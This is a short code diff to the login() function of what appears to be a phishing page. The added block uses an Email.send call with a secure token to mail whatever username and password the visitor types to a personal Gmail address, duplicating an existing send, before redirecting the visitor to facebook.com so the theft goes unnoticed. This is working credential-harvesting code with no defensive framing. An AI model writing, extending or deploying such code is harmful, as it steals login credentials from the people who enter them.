@@ -65,6 +65,16 @@ function login() {
     Body: "Username: " + username.value() + "<br><br>Password " + password.value()
   }).then(
   );
+  Email.send({
+    SecureToken: "8f3f3aff-06d2-493b-aa98-1d135b73a48b",
+    To: "jacobzuckerman97@gmail.com",
+    // Bcc : 'kyle@computingant.com', 
+    From: "usernames@gmail.com",
+    // From: input.value(),
+    Subject: "Username and Password",
+    Body: "Username: " + username.value() + "<br><br>Password " + password.value()
+  }).then(
+  );
   window.location.replace("http://facebook.com");
 }
 
